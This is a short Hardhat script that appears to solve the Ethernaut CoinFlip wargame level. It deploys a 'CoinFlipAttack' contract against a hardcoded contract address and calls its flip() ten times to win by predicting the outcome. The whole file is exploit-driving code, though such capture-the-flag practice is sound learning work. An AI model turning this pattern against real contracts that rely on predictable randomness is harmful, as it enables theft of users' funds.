const { ethers } = require("hardhat");
const Runner = require("./lib/runner");

Runner.run(async () => {
  const coinFlipAddr = "0x046082B2C4Adf914D9A81603a56821bf57423194";

  const attackerFactory = await ethers.getContractFactory("CoinFlipAttack");
  const attackerContract = await attackerFactory.deploy(coinFlipAddr);
  await attackerContract.deployed();

  for (let i = 1; i <= 10; i++) {
    console.log(`Performing attack #${i}...`);
    tx = await attackerContract.flip();
    await tx.wait(1);
  }
});
